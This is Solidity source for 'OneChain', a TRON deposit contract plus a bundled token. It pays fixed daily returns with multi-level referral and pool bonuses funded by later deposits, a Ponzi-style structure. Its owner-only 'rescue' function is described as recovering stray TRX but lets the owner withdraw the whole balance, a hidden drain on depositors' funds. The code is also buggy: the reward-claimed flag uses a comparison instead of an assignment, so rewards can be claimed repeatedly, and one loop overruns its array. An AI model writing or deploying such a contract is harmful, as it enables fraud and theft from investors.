//SourceUnit: OneChain.sol

/**   ┌───────────────────────────────────────────────────────────────────────┐  
*     │   Website: https://onechain.co                                        │
*     │                                                                       │  
*     │   Telegram Channel : https://t.me/onechainx                           │  
*     │   Telegram Group : https://t.me/onechainworldwide                     │  
*     │                                                                       │  
*     │   Email : support@onechain.co                                         │
*     └───────────────────────────────────────────────────────────────────────┘ 
*/ 

pragma solidity 0.5.10;

import "./Trc20token.sol";

contract OneChain {
    struct Account {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable public owner;
    address payable public etherchain_fund;
    address payable public admin_fee;

    mapping(address => Account) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;                    

    uint8[] public pool_bonuses;                    
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    mapping(address => uint256) public distribution;
    mapping(address => bool) public reward_dis_claimed;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    bool private redeem;
    Token private _token;
    uint256 private _supply;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event RedeemReward(address addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        
        etherchain_fund = 0xa0FF6B875E5bEaF5CF685fadAf3b9f079248E44a;
        admin_fee = 0x6398690af91662e0bBB56fD89D0E340E2f7b656c;
        
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);

        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _setDistribution(address _addr, uint256 _amount) private {
        distribution[_addr] += _amount;
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        _setDistribution(msg.sender, _amount);

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }

        admin_fee.transfer(_amount / 50);
        etherchain_fund.transfer(_amount * 3 / 100);
    }

    function _redeem() private {
        require(distribution[msg.sender] > 0, 'No deposit');
        require(redeem == true, "Redeem closed");
        require(reward_dis_claimed[msg.sender] == false, "Already redeem");

        uint256 reward = _supply / (distribution[msg.sender] / 1000000);

        require(reward > 0, "no reward");

        reward_dis_claimed[msg.sender] == true;
        _token.transfer(msg.sender, reward);

        emit RedeemReward(msg.sender, reward);
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
        uint256 min = 100000000;
        require(msg.value >= min, "min 100 trx");
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    function claimReward() external {
        _redeem();
    }

    function redeemOption(uint256 _option) external onlyOwner {
        if(_option == 1) {
            redeem = true;
        }
        else redeem = false;
    }

    function rewardOption(uint256 _option, address token_) external onlyOwner {
        _token = Token(token_);
        _supply = _option;
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 36 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {            
            uint256 calculatePerDay = (users[_addr].deposit_amount * 1800000) / 100000000;

            uint256 daysCount = 0;

            uint256 findMod = (block.timestamp - users[_addr].deposit_time) % 1 days;
            if(findMod > 0){
                daysCount = ((block.timestamp - users[_addr].deposit_time) - findMod) / 1 days;
            }else{
                daysCount = (block.timestamp - users[_addr].deposit_time) / 1 days;
            }

            if(daysCount > 0){
                payout = (daysCount * calculatePerDay) - users[_addr].deposit_payouts;

                if(users[_addr].deposit_payouts + payout > max_payout) {
                    payout = max_payout - users[_addr].deposit_payouts;
                }
            }
        }
    }

    /**
    * @dev rescue simple transfered TRX.
    */
    function rescue(address payable to_, uint256 amount_)
    external
    onlyOwner
    {
        require(to_ != address(0), "must not 0");
        require(amount_ > 0, "must gt 0");

        to_.transfer(amount_);
    }
    /**
     * @dev rescue simple transfered unrelated token.
     */
    function rescue(address to_, address token_, uint256 amount_)
    external
    onlyOwner
    {
        require(to_ != address(0), "must not 0");
        require(amount_ > 0, "must gt 0");

        Token _token = Token(token_);

        _token.transfer(to_, amount_);
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}

//SourceUnit: Trc20token.sol

pragma solidity ^0.5.0;

contract TRC20Interface {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor () public {
      owner = msg.sender;
    }

    modifier onlyOwner {
      require(msg.sender == owner);
      _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
      newOwner = _newOwner;
    }

    function acceptOwnership() public {
      require(msg.sender == newOwner);
      emit OwnershipTransferred(owner, newOwner);
      owner = newOwner;
      newOwner = address(0);
    }
}

/**
Function to receive approval and execute function in one call.
 */
contract TokenRecipient { 
  function receiveApproval(address _from, uint256 _value, address _token, bytes memory _extraData) public; 
}

/**
Token implement
 */
contract Token is TRC20Interface, Owned {

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowed;
    
    // This notifies clients about the amount burnt
    event Burn(address indexed from, uint256 value);
    
    function balanceOf(address _owner) public view returns (uint256 balance) {
      return _balances[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
      _transfer(msg.sender, _to, _value);
      return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
      require(_value <= _allowed[_from][msg.sender]); 
      _allowed[_from][msg.sender] -= _value;
      _transfer(_from, _to, _value);
      return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
      _allowed[msg.sender][_spender] = _value;
      emit Approval(msg.sender, _spender, _value);
      return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
      return _allowed[_owner][_spender];
    }

    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
      return TRC20Interface(tokenAddress).transfer(owner, tokens);
    }
    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success) {
      TokenRecipient spender = TokenRecipient(_spender);
      approve(_spender, _value);
      spender.receiveApproval(msg.sender, _value, address(this), _extraData);
      return true;
    }

    function burn(uint256 _value) public returns (bool success) {
      require(_balances[msg.sender] >= _value);
      _balances[msg.sender] -= _value;
      totalSupply -= _value;
      emit Burn(msg.sender, _value);
      return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) {
      require(_balances[_from] >= _value);
      require(_value <= _allowed[_from][msg.sender]);
      _balances[_from] -= _value;
      _allowed[_from][msg.sender] -= _value;
      totalSupply -= _value;
      emit Burn(_from, _value);
      return true;
    }

    function _transfer(address _from, address _to, uint _value) internal {
      // Prevent transfer to 0x0 address. Use burn() instead
      require(_to != address(0x0));
      // Check if the sender has enough
      require(_balances[_from] >= _value);
      // Check for overflows
      require(_balances[_to] + _value > _balances[_to]);
      // Save this for an assertion in the future
      uint previousBalances = _balances[_from] + _balances[_to];
      // Subtract from the sender
      _balances[_from] -= _value;
      // Add the same to the recipient
      _balances[_to] += _value;
      emit Transfer(_from, _to, _value);
      // Asserts are used to use static analysis to find bugs in your code. They should never fail
      assert(_balances[_from] + _balances[_to] == previousBalances);
    }

}